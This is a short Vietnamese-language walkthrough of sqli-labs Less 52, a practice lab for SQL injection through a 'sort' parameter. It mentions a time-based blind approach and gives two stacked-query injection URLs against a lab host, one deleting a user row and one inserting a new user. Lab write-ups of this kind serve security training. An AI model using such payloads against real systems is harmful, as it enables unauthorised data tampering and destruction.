# Less 52

Đề bài cho phép truyền vào params là `sort`

![](../images/sqli-labs/Less-52/01.png)

Thử truyền vào một số giá trị

![](../images/sqli-labs/Less-52/02.png)

![](../images/sqli-labs/Less-52/03.png)

![](../images/sqli-labs/Less-52/04.png)

Tôi thử truyền vào một số giá trị có thể gây ra lỗi

![](../images/sqli-labs/Less-52/05.png)

![](../images/sqli-labs/Less-52/06.png)

Ta thấy lỗi không được hiển thị lên màn hình

Sử dụng time based để khai thác DB

![](../images/sqli-labs/Less-52/07.png)

![](../images/sqli-labs/Less-52/08.png)

Trong bài này có sử dụng hàm cho phép thực thi nhiều câu query cùng lúc

![](../images/sqli-labs/Less-52/09.png)

Tôi thực hiện xóa username `less44` và thêm vào username `less52`

```
http://192.168.84.233/sqli-labs/Less-52/?sort=1; delete from users where id=44 --+
http://192.168.84.233/sqli-labs/Less-52/?sort=1; insert into users values (52, 'less52','less52') --+
```

![](../images/sqli-labs/Less-52/11.png)
